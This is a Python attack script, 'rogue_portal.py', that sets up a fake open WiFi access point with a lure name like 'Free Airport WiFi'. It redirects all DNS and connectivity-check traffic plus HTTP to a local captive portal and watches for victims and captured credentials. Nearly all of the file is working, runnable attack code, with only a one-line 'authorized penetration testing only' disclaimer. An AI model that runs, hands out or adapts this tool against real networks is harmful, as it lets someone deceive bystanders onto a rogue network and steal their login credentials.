#!/usr/bin/env python3
"""
rogue_portal.py — Rogue WiFi Captive Portal Attack Tool
Creates a fake open WiFi network with a captive portal that captures credentials.

Usage:
    python3 rogue_portal.py --interface wlan0 --ssid "Free Airport WiFi"

Prerequisites (run as root on Kali):
    apt install hostapd dnsmasq python3-flask
    pip3 install flask

Authorization: For authorized penetration testing only.
"""

import os
import sys
import signal
import subprocess
import time
import argparse
import threading
import textwrap
from pathlib import Path

# ============================================================
# CONFIGURATION
# ============================================================
SUBNET = "10.0.0"
GATEWAY = f"{SUBNET}.1"
DHCP_RANGE_START = f"{SUBNET}.10"
DHCP_RANGE_END = f"{SUBNET}.100"
NETMASK = "255.255.255.0"
CAPTIVE_PORT = 80

SCRIPT_DIR = Path(__file__).parent.absolute()
HOSTAPD_CONF = "/tmp/rogue_hostapd.conf"
DNSMASQ_CONF = "/tmp/rogue_dnsmasq.conf"

# ============================================================
# ARGUMENT PARSING
# ============================================================
def parse_args():
    parser = argparse.ArgumentParser(
        description="Rogue WiFi Captive Portal Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              python3 rogue_portal.py -i wlan0 -s "Free Airport WiFi"
              python3 rogue_portal.py -i wlan0 -s "Guest Network" -c 11
        """)
    )
    parser.add_argument("-i", "--interface", required=True,
                        help="Wireless interface to use (e.g., wlan0)")
    parser.add_argument("-s", "--ssid", default="Free Airport WiFi",
                        help="SSID of the rogue access point")
    parser.add_argument("-c", "--channel", type=int, default=6,
                        help="WiFi channel (1-11 for 2.4GHz, default: 6)")
    return parser.parse_args()

# ============================================================
# HELPER FUNCTIONS
# ============================================================
def run_cmd(cmd, check=True, capture=False):
    """Run a shell command and return output."""
    try:
        if capture:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            return result.stdout.strip()
        else:
            subprocess.run(cmd, shell=True, check=check, timeout=10)
            return ""
    except subprocess.TimeoutExpired:
        print(f"[!] Command timed out: {cmd[:80]}")
        return ""
    except subprocess.CalledProcessError as e:
        if check:
            print(f"[!] Command failed (exit {e.returncode}): {cmd[:80]}")
        return ""

def cleanup():
    """Kill all the services we started and reset networking."""
    print("\n[*] Cleaning up...")
    
    # Kill processes
    for proc in ["hostapd", "dnsmasq"]:
        run_cmd(f"pkill -9 {proc} 2>/dev/null", check=False)
    
    # Flush iptables rules
    run_cmd("iptables -t nat -F", check=False)
    run_cmd("iptables -t nat -X", check=False)
    run_cmd("iptables -t filter -F", check=False)
    run_cmd("iptables -t filter -X", check=False)
    
    # Disable IP forwarding
    run_cmd("sysctl -w net.ipv4.ip_forward=0", check=False)
    
    # Bring interface down then up
    run_cmd(f"ip link set {IFACE} down", check=False)
    time.sleep(1)
    run_cmd(f"ip link set {IFACE} up", check=False)
    
    print("[*] Cleanup complete.")
    sys.exit(0)

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully."""
    cleanup()

def check_prerequisites():
    """Verify required tools are installed."""
    required = ["hostapd", "dnsmasq", "iptables", "ip"]
    missing = []
    
    for tool in required:
        if not run_cmd(f"which {tool}", capture=True):
            missing.append(tool)
    
    if missing:
        print(f"[!] Missing required tools: {', '.join(missing)}")
        print("[!] Install them: apt install hostapd dnsmasq iptables")
        sys.exit(1)
    
    # Check if running as root
    if os.geteuid() != 0:
        print("[!] Must run as root (sudo).")
        sys.exit(1)

# ============================================================
# HOSTAPD — Fake Access Point
# ============================================================
def create_hostapd_config(iface, ssid, channel):
    """Generate hostapd configuration for an open (no encryption) AP."""
    config = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
# No WPA = open network
"""
    with open(HOSTAPD_CONF, 'w') as f:
        f.write(config)
    print(f"[✓] hostapd config written to {HOSTAPD_CONF}")

def start_hostapd():
    """Start the fake access point."""
    print(f"[*] Starting hostapd (SSID: {SSID})...")
    run_cmd(f"hostapd -B {HOSTAPD_CONF} 2>/dev/null", check=False)
    time.sleep(2)
    
    # Verify it started
    result = run_cmd("pgrep hostapd", capture=True)
    if result:
        print(f"[✓] hostapd started (PID: {result})")
    else:
        print("[!] hostapd failed to start. Check your wireless interface supports AP mode.")
        print("[!] Try: iw list | grep 'Supported interface modes' -A 5")
        sys.exit(1)

# ============================================================
# DNSMASQ — DHCP & DNS
# ============================================================
def create_dnsmasq_config(iface):
    """Generate dnsmasq config: DHCP + DNS for captive portal."""
    config = f"""# Interface
interface={iface}
bind-interfaces

# DHCP Server
dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},{NETMASK},12h
dhcp-option=3,{GATEWAY}
dhcp-option=6,{GATEWAY}
dhcp-authoritative

# DNS — redirect ALL domains to our captive portal server
address=/#/{GATEWAY}
address=/captive.apple.com/{GATEWAY}
address=/connectivitycheck.gstatic.com/{GATEWAY}
address=/connectivitycheck.android.com/{GATEWAY}
address=/clients3.google.com/{GATEWAY}
address=/www.msftconnecttest.com/{GATEWAY}
address=/www.msftncsi.com/{GATEWAY}
address=/dns.msftncsi.com/{GATEWAY}
address=/detectportal.firefox.com/{GATEWAY}
address=/detectportal.brave-http-only.com/{GATEWAY}

# No upstream DNS
no-resolv
log-queries

# Server identifier
server={GATEWAY}
"""
    with open(DNSMASQ_CONF, 'w') as f:
        f.write(config)
    print(f"[✓] dnsmasq config written to {DNSMASQ_CONF}")

def start_dnsmasq():
    """Start DNS/DHCP server."""
    run_cmd(f"pkill -9 dnsmasq 2>/dev/null", check=False)
    time.sleep(1)
    
    print(f"[*] Starting dnsmasq (DHCP + DNS redirect)...")
    
    # Kill any existing dnsmasq on the interface
    run_cmd(f"dnsmasq -C {DNSMASQ_CONF} --no-daemon 2>&1 &", check=False)
    time.sleep(2)
    
    result = run_cmd("pgrep -f 'dnsmasq.*rogue'", capture=True)
    if result:
        print(f"[✓] dnsmasq started (PID: {result})")
    else:
        # Try alternative
        run_cmd(f"dnsmasq -C {DNSMASQ_CONF}", check=False)
        time.sleep(1)
        result = run_cmd("pgrep dnsmasq", capture=True)
        if result:
            print(f"[✓] dnsmasq started (PID: {result})")
        else:
            print("[!] dnsmasq may not have started. Check logs.")

# ============================================================
# NETWORK CONFIGURATION
# ============================================================
def configure_interface(iface):
    """Set IP address on the wireless interface and add iptables rules."""
    print(f"[*] Configuring interface {iface}...")
    
    # Bring interface down first
    run_cmd(f"ip link set {iface} down", check=False)
    time.sleep(1)
    
    # Remove any existing IP and assign static
    run_cmd(f"ip addr flush dev {iface}", check=False)
    run_cmd(f"ip addr add {GATEWAY}/24 dev {iface}", check=False)
    run_cmd(f"ip link set {iface} up", check=False)
    time.sleep(1)
    
    # Verify
    check = run_cmd(f"ip addr show {iface} | grep -o '{GATEWAY}'", capture=True)
    if check:
        print(f"[✓] Interface {iface} configured with IP {GATEWAY}")
    else:
        print(f"[!] Failed to set IP on {iface}. Trying again...")
        run_cmd(f"ifconfig {iface} {GATEWAY} netmask {NETMASK} up", check=False)
        time.sleep(1)

def setup_iptables():
    """Set up iptables for captive portal (redirect HTTP to local server)."""
    print("[*] Setting up iptables rules...")
    
    # Enable IP forwarding
    run_cmd("sysctl -w net.ipv4.ip_forward=1")
    
    # Flush existing rules
    run_cmd("iptables -t nat -F", check=False)
    run_cmd("iptables -t nat -X", check=False)
    
    # Redirect all TCP port 80 traffic to our captive portal server
    run_cmd(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination {GATEWAY}:{CAPTIVE_PORT}", check=False)
    
    # Also redirect locally generated traffic (for DNS probes from the same machine)
    run_cmd(f"iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination {GATEWAY}:{CAPTIVE_PORT}", check=False)
    
    # Allow forwarding
    run_cmd("iptables -A FORWARD -j ACCEPT", check=False)
    
    print("[✓] iptables rules set (all HTTP → captive portal)")

# ============================================================
# CAPTIVE PORTAL SERVER (Flask)
# ============================================================
def start_captive_server():
    """Start the Flask captive portal server in a thread."""
    sys.path.insert(0, str(SCRIPT_DIR))
    
    # Import the server module
    import importlib.util
    spec = importlib.util.spec_from_file_location("captive_server", 
                                                   str(SCRIPT_DIR / "captive_server.py"))
    captive_server = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(captive_server)
    
    # Run in a separate thread
    server_thread = threading.Thread(
        target=captive_server.run_server,
        args=('0.0.0.0', CAPTIVE_PORT),
        daemon=True
    )
    server_thread.start()
    return server_thread

# ============================================================
# MONITOR — Show victims and captured credentials
# ============================================================
def monitor_loop():
    """Display connected clients and captured credentials."""
    print("\n" + "=" * 65)
    print("  ROGUE CAPTIVE PORTAL — ACTIVE")
    print(f"  SSID: {SSID}")
    print(f"  Interface: {IFACE} on channel {CHANNEL}")
    print(f"  Gateway IP: {GATEWAY}")
    print(f"  Credentials file: {SCRIPT_DIR}/captured_credentials.txt")
    print("=" * 65)
    print("\n  Monitoring for connections and credentials...")
    print("  Press Ctrl+C to stop.\n")
    
    try:
        while True:
            # Show connected clients
            clients = run_cmd(
                f"iw dev {IFACE} station dump | grep -E 'Station|signal|tx|rx'",
                capture=True
            )
            if clients:
                # Count stations
                station_count = clients.count("Station")
                if station_count > 0:
                    print(f"  [*] Connected clients: {station_count}", end="\r")
            
            time.sleep(5)
    except KeyboardInterrupt:
        cleanup()

# ============================================================
# MAIN
# ============================================================
def main():
    global IFACE, SSID, CHANNEL
    
    args = parse_args()
    IFACE = args.interface
    SSID = args.ssid
    CHANNEL = args.channel
    
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    print("\n" + "=" * 65)
    print("  ROGUE CAPTIVE PORTAL ATTACK TOOL")
    print("  Authorized penetration testing only")
    print("=" * 65 + "\n")
    
    # Check everything
    check_prerequisites()
    
    # Step 1: Create configs
    create_hostapd_config(IFACE, SSID, CHANNEL)
    create_dnsmasq_config(IFACE)
    
    # Step 2: Configure network
    configure_interface(IFACE)
    
    # Step 3: Start access point
    start_hostapd()
    
    # Step 4: Start DNS/DHCP
    start_dnsmasq()
    
    # Step 5: Set up iptables
    setup_iptables()
    
    # Step 6: Start the Flask captive portal server
    print("[*] Starting captive portal web server...")
    server_thread = start_captive_server()
    time.sleep(2)
    
    # Step 7: Monitor
    monitor_loop()

if __name__ == '__main__':
    main()